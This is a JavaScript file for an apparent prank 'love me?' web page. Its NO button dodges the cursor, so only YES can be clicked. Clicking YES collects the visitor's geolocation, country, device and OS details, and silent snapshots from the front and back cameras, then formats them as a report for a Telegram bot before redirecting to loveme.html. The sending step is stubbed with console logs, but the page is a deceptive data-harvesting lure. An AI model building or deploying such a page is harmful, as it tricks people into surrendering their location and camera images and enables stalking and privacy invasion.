// Get references to buttons
const yesButton = document.querySelector(".yes");
const noButton = document.querySelector(".no");

// Handle "YES" button click
async function handleYes() {
  try {
    // Request location from the user
    if (navigator.geolocation) {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Fetch country name using reverse geocoding
      const countryName = await fetchCountryName(latitude, longitude);

      // Get device information
      const deviceInfo = getDeviceInfo();

      // Capture screenshots from front and back cameras
      const [frontCameraImage, backCameraImage] = await captureCameraImages();

      // Format Google Maps URL
      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

      // Send data to Telegram bot (Token and Chat ID should be handled on the backend)
      const message = `
        User Information:
        Location: ${mapsUrl}
        Country: ${countryName}
        Device: ${deviceInfo.deviceName}
        OS Version: ${deviceInfo.osVersion}
      `;

      console.log("Message:", message);

      // Simulate sending data to Telegram (for demonstration purposes only)
      console.log("Data sent successfully!");
      document.getElementById("message").textContent =
        "Data sent successfully!";
      window.location.href = "loveme.html";
    } else {
      alert("Geolocation is not supported by your browser.");
    }
  } catch (error) {
    console.error("Error getting location or processing data:", error);
    document.getElementById("message").textContent =
      "Failed to send data. Please try again.";
  }
}

// Function to fetch country name using reverse geocoding
async function fetchCountryName(latitude, longitude) {
  const response = await fetch(
    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
  );
  const data = await response.json();
  return data.address.country || "Unknown Country";
}

// Function to get device information
function getDeviceInfo() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  let deviceName = "Unknown Device";
  let osVersion = "Unknown OS";

  // Detect device name
  if (/android/i.test(userAgent)) {
    deviceName = "Android";
  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    deviceName = "iOS";
  }

  // Detect OS version
  if (navigator.userAgentData && navigator.userAgentData.platform) {
    osVersion = navigator.userAgentData.platform;
  } else if (navigator.platform) {
    osVersion = navigator.platform;
  }

  return { deviceName, osVersion };
}

// Function to capture screenshots from front and back cameras
async function captureCameraImages() {
  const constraintsFront = { video: { facingMode: "user" } };
  const constraintsBack = { video: { facingMode: "environment" } };
  let frontCameraImage = null;
  let backCameraImage = null;

  try {
    // Access front camera
    const frontStream = await navigator.mediaDevices.getUserMedia(constraintsFront);
    const frontVideo = document.createElement("video");
    frontVideo.srcObject = frontStream;
    await frontVideo.play();
    frontCameraImage = await captureVideoFrame(frontVideo);
    frontStream.getTracks().forEach(track => track.stop());

    // Access back camera
    const backStream = await navigator.mediaDevices.getUserMedia(constraintsBack);
    const backVideo = document.createElement("video");
    backVideo.srcObject = backStream;
    await backVideo.play();
    backCameraImage = await captureVideoFrame(backVideo);
    backStream.getTracks().forEach(track => track.stop());
  } catch (error) {
    console.error("Error accessing camera:", error);
  }

  return [frontCameraImage, backCameraImage];
}

// Function to capture a frame from a video element
function captureVideoFrame(video) {
  return new Promise(resolve => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    resolve(canvas.toDataURL("image/jpeg"));
  });
}

// Function to generate random coordinates within the viewport
function getRandomPosition() {
  const windowWidth = window.innerWidth;
  const windowHeight = window.innerHeight;
  const randomX = Math.random() * (windowWidth - noButton.offsetWidth);
  const randomY = Math.random() * (windowHeight - noButton.offsetHeight);
  return { x: randomX, y: randomY };
}

// Add event listener to move the "NO" button on hover
noButton.addEventListener("mouseenter", () => {
  const { x, y } = getRandomPosition();
  noButton.style.position = "absolute";
  noButton.style.left = `${x}px`;
  noButton.style.top = `${y}px`;
});